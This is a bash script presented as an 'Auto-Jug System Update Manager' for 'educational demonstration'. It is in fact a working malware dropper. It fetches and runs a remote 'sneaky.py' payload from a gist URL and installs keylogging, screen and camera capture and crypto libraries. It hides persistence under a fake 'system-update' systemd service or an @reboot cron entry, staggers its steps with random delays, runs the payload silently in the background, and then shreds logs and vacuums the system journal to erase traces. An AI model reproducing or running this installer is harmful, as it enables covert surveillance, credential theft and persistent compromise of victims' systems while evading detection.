#!/bin/bash

# Auto-Jug System Update Manager for Linux
# Version 1.1
# Author: Bigawn
# Purpose: Remote administration tool for educational demonstration
# Date: March 09, 2025

# Detect architecture
ARCH=$(uname -m)
if [ "$ARCH" = "x86_64" ]; then
    PYTHON_URL="https://www.python.org/ftp/python/3.11.0/Python-3.11.0.tar.xz"
elif [ "$ARCH" = "i686" ] || [ "$ARCH" = "i386" ]; then
    PYTHON_URL="https://www.python.org/ftp/python/3.11.0/Python-3.11.0.tar.xz"
elif [ "$ARCH" = "armv7l" ] || [ "$ARCH" = "aarch64" ]; then
    PYTHON_URL="https://www.python.org/ftp/python/3.11.0/Python-3.11.0.tar.xz"
else
    echo "[$(date)] Unsupported architecture: $ARCH" >> ~/autojug_debug.log
    exit 1
fi

# Define variables
DOWNLOAD_URL="https://gist.github.com/jonhardwick-spec/41455097cfe76beaf4464d8dbd0ab35b/raw"
TARGET_DIR="$HOME/.config/SystemUtilities"
TARGET_FILE="$TARGET_DIR/sneaky.py"
TEMP_FILE="/tmp/temp_update.dat"
PYTHON_DIR="$HOME/.python_runtime"
PYTHON_PATH="$PYTHON_DIR/bin/python3"
DEBUG_LOG="$HOME/autojug_debug.log"
MAX_RETRY_ATTEMPTS=3
RETRY_INTERVAL=5
RANDOM_DELAY_MIN=5
RANDOM_DELAY_MAX=30

# Clear previous debug log
[ -f "$DEBUG_LOG" ] && rm "$DEBUG_LOG"

# Log start of script with system info
echo "[$(date)] Starting Auto-Jug System Update Manager on Linux" >> "$DEBUG_LOG"
echo "[$(date)] Architecture: $ARCH" >> "$DEBUG_LOG"
echo "[$(date)] Distro: $(cat /etc/os-release | grep ^ID= | cut -d= -f2)" >> "$DEBUG_LOG"
echo "[$(date)] User: $USER" >> "$DEBUG_LOG"
echo "[$(date)] PATH: $PATH" >> "$DEBUG_LOG"

# Create directory if it doesn't exist
[ ! -d "$TARGET_DIR" ] && mkdir -p "$TARGET_DIR" || echo "[$(date)] Directory already exists: $TARGET_DIR" >> "$DEBUG_LOG"

# Check for sudo privileges
sudo -n true 2>/dev/null
IS_ADMIN=$?
if [ $IS_ADMIN -ne 0 ]; then
    echo "[$(date)] Non-admin detected, proceeding without sudo..." >> "$DEBUG_LOG"
fi

# Configure persistence with systemd enablement
echo "[$(date)] Configuring persistence..." >> "$DEBUG_LOG"
if [ $IS_ADMIN -eq 0 ]; then
    cat << EOF > "$HOME/.config/systemd/user/system-update.service"
[Unit]
Description=System Update Service

[Service]
ExecStart=$PYTHON_PATH $TARGET_FILE
Restart=always

[Install]
WantedBy=default.target
EOF
    loginctl enable-linger $(whoami) 2>/dev/null
    systemctl --user enable system-update.service 2>/dev/null || echo "[$(date)] Systemd persistence failed, using cron fallback..." >> "$DEBUG_LOG"
else
    (crontab -l 2>/dev/null; echo "@reboot $PYTHON_PATH $TARGET_FILE") | crontab - 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[$(date)] Cron persistence configured" >> "$DEBUG_LOG"
    else
        echo "[$(date)] Cron persistence failed" >> "$DEBUG_LOG"
    fi
fi

# Check for Python
echo "[$(date)] Checking for Python..." >> "$DEBUG_LOG"
FOUND_PYTHON=""
for cmd in python3 python; do
    if command -v $cmd >/dev/null 2>&1; then
        $cmd -c "import sys; sys.exit(0)" 2>/dev/null
        if [ $? -eq 0 ]; then
            FOUND_PYTHON=$cmd
            echo "[$(date)] Found $cmd in PATH" >> "$DEBUG_LOG"
            break
        fi
    fi
done

# Test if found Python works with dependencies
if [ -n "$FOUND_PYTHON" ]; then
    PYTHON_PATH=$(command -v $FOUND_PYTHON)
    echo "[$(date)] Testing Python: $PYTHON_PATH..." >> "$DEBUG_LOG"
    echo "import pynput" > /tmp/test_python.py
    $PYTHON_PATH /tmp/test_python.py 2>/dev/null
    if [ $? -ne 0 ]; then
        echo "[$(date)] Python test failed, proceeding with embedded download" >> "$DEBUG_LOG"
        FOUND_PYTHON=""
    else
        echo "[$(date)] Python test successful, using existing Python" >> "$DEBUG_LOG"
    fi
    rm -f /tmp/test_python.py
fi

# If Python test failed or not found, compile Python from source with retries
if [ -z "$FOUND_PYTHON" ]; then
    echo "[$(date)] Python not found or test failed, compiling Python from source..." >> "$DEBUG_LOG"
    if [ ! -f "$PYTHON_PATH" ]; then
        mkdir -p "$PYTHON_DIR"
        for ((i=1; i<=MAX_RETRY_ATTEMPTS; i++)); do
            wget -q "$PYTHON_URL" -O /tmp/python.tar.xz || curl -s "$PYTHON_URL" -o /tmp/python.tar.xz
            if [ -f "/tmp/python.tar.xz" ]; then
                tar -xJf /tmp/python.tar.xz -C /tmp
                cd /tmp/Python-3.11.0
                ./configure --prefix="$PYTHON_DIR" --enable-optimizations
                make -j$(nproc)
                make install
                cd -
                rm -rf /tmp/Python-3.11.0 /tmp/python.tar.xz
                if [ -f "$PYTHON_PATH" ]; then
                    echo "[$(date)] Compiled Python installed at $PYTHON_PATH" >> "$DEBUG_LOG"
                    break
                fi
            fi
            if [ $i -lt $MAX_RETRY_ATTEMPTS ]; then
                echo "[$(date)] Retry $i/$MAX_RETRY_ATTEMPTS failed, waiting $RETRY_INTERVAL seconds..." >> "$DEBUG_LOG"
                sleep $RETRY_INTERVAL
            else
                echo "[$(date)] All retries failed for Python compilation" >> "$DEBUG_LOG"
                exit 1
            fi
        done
    fi
fi

# Download the script with random delay and retries
RANDOM_DELAY=$((RANDOM_DELAY_MIN + (RANDOM_DELAY_MAX - RANDOM_DELAY_MIN) * RANDOM / 32768))
echo "[$(date)] Applying random delay of $RANDOM_DELAY seconds..." >> "$DEBUG_LOG"
sleep $RANDOM_DELAY
echo "[$(date)] Downloading sneaky.py from $DOWNLOAD_URL..." >> "$DEBUG_LOG"
for ((i=1; i<=MAX_RETRY_ATTEMPTS; i++)); do
    wget -q "$DOWNLOAD_URL" -O "$TEMP_FILE" || curl -s "$DOWNLOAD_URL" -o "$TEMP_FILE"
    if [ -f "$TEMP_FILE" ]; then
        mv "$TEMP_FILE" "$TARGET_FILE"
        echo "[$(date)] Successfully downloaded sneaky.py to $TARGET_FILE" >> "$DEBUG_LOG"
        break
    fi
    if [ $i -lt $MAX_RETRY_ATTEMPTS ]; then
        echo "[$(date)] Retry $i/$MAX_RETRY_ATTEMPTS failed, waiting $RETRY_INTERVAL seconds..." >> "$DEBUG_LOG"
        sleep $RETRY_INTERVAL
    else
        echo "[$(date)] All retries failed to download sneaky.py" >> "$DEBUG_LOG"
        exit 1
    fi
done

# Install dependencies with random delay and retries
RANDOM_DELAY=$((RANDOM_DELAY_MIN + (RANDOM_DELAY_MAX - RANDOM_DELAY_MIN) * RANDOM / 32768))
echo "[$(date)] Applying random delay of $RANDOM_DELAY seconds before dependency install..." >> "$DEBUG_LOG"
sleep $RANDOM_DELAY
echo "[$(date)] Installing dependencies..." >> "$DEBUG_LOG"
$PYTHON_PATH -m ensurepip --upgrade 2>/dev/null
if [ $? -ne 0 ]; then
    echo "[$(date)] Failed to set up ensurepip, retrying..." >> "$DEBUG_LOG"
    sleep $RETRY_INTERVAL
    $PYTHON_PATH -m ensurepip --upgrade 2>/dev/null
fi
$PYTHON_PATH -m pip install --user --quiet pynput==1.7.6 Pillow==10.0.0 opencv-python==4.8.0.76 pycryptodome==3.19.0 psutil==5.9.5 2>/dev/null
if [ $? -ne 0 ]; then
    echo "[$(date)] Failed to install dependencies, retrying..." >> "$DEBUG_LOG"
    sleep $RETRY_INTERVAL
    $PYTHON_PATH -m pip install --user --quiet pynput==1.7.6 Pillow==10.0.0 opencv-python==4.8.0.76 pycryptodome==3.19.0 psutil==5.9.5 2>/dev/null
fi
echo "[$(date)] Dependencies installed successfully" >> "$DEBUG_LOG"

# Verify dependencies with random delay
RANDOM_DELAY=$((RANDOM_DELAY_MIN + (RANDOM_DELAY_MAX - RANDOM_DELAY_MIN) * RANDOM / 32768))
echo "[$(date)] Applying random delay of $RANDOM_DELAY seconds before dependency verification..." >> "$DEBUG_LOG"
sleep $RANDOM_DELAY
echo "[$(date)] Verifying dependencies..." >> "$DEBUG_LOG"
echo "import pynput; import PIL; import cv2; import Cryptodome; import psutil" > /tmp/check_deps.py
$PYTHON_PATH /tmp/check_deps.py 2>/dev/null
if [ $? -ne 0 ]; then
    echo "[$(date)] Dependency verification failed, retrying install..." >> "$DEBUG_LOG"
    $PYTHON_PATH -m pip install --user --quiet pynput==1.7.6 Pillow==10.0.0 opencv-python==4.8.0.76 pycryptodome==3.19.0 psutil==5.9.5 2>/dev/null
    if [ $? -ne 0 ]; then
        echo "[$(date)] Retry failed for dependencies" >> "$DEBUG_LOG"
        exit 1
    fi
    echo "[$(date)] Dependencies installed on retry" >> "$DEBUG_LOG"
else
    echo "[$(date)] Dependencies verified successfully" >> "$DEBUG_LOG"
fi
rm -f /tmp/check_deps.py

# Run the script in the background with random delay
RANDOM_DELAY=$((RANDOM_DELAY_MIN + (RANDOM_DELAY_MAX - RANDOM_DELAY_MIN) * RANDOM / 32768))
echo "[$(date)] Applying random delay of $RANDOM_DELAY seconds before execution..." >> "$DEBUG_LOG"
sleep $RANDOM_DELAY
echo "[$(date)] Starting sneaky.py..." >> "$DEBUG_LOG"
nohup $PYTHON_PATH "$TARGET_FILE" >/dev/null 2>&1 &

# Clean traces
echo "[$(date)] Cleaning traces..." >> "$DEBUG_LOG"
shred -zu -n 3 *.log 2>/dev/null
journalctl --flush --rotate --vacuum-time=1s 2>/dev/null

exit 0